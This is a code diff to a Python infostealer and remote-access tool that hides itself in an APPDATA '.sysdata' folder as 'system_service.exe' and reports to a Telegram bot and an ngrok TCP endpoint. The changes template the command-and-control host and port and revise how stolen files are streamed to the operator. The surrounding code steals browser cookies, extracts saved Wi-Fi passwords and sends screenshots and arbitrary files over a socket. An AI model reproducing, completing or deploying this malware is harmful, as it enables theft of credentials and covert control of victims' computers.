@@ -41,8 +41,8 @@ def single_instance_check():
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
-NGROK_HOST = "7.tcp.eu.ngrok.io"
-NGROK_PORT = 18855
+NGROK_HOST = "<<NGROK_HOST>>"
+NGROK_PORT = int("<<NGROK_PORT>>")
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
 EXE_NAME = "system_service.exe"
 EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
@@ -228,6 +228,7 @@ def steal_browser():
                     conn.close()
                     os.remove("tmp_cookie.db")
                 except Exception as e:
+                    log_path = os.path.join(EXTRACT_FOLDER, "cookie_error.log")
                     with open(log_path, "a", encoding="utf-8") as log:
                         log.write(f"[{name}] Cookie extraction failed: {e}\n")
 
@@ -544,7 +545,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                     output_path = os.path.join(EXTRACT_FOLDER, "wifi.txt")
                     extract_wifi()
                     with open(output_path, "rb") as f:
-                        s.sendall(b"STARTFILE\n")
+                        s.sendall(f"STARTFILE:wifi.txt\n".encode())
                         while True:
                             chunk = f.read(1024)
                             if not chunk:
@@ -569,7 +570,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                 
                         # If saved successfully, send the file
                         with open(ss_path, "rb") as f:
-                            s.sendall(b"STARTFILE\n")
+                            s.sendall(f"STARTFILE:wifi.txt\n".encode())
                             while True:
                                 chunk = f.read(1024)
                                 if not chunk:
@@ -588,7 +589,7 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                     if os.path.exists(filename):
                         try:
                             with open(filename, "rb") as f:
-                                s.sendall(b"STARTFILE\n")
+                                s.sendall(f"STARTFILE:wifi.txt\n".encode())
                                 while True:
                                     chunk = f.read(1024)
                                     if not chunk:
@@ -696,14 +697,4 @@ def run():
 
 if __name__ == "__main__":
     run()
-
-
-
-
-
-
-
-
-
-
 
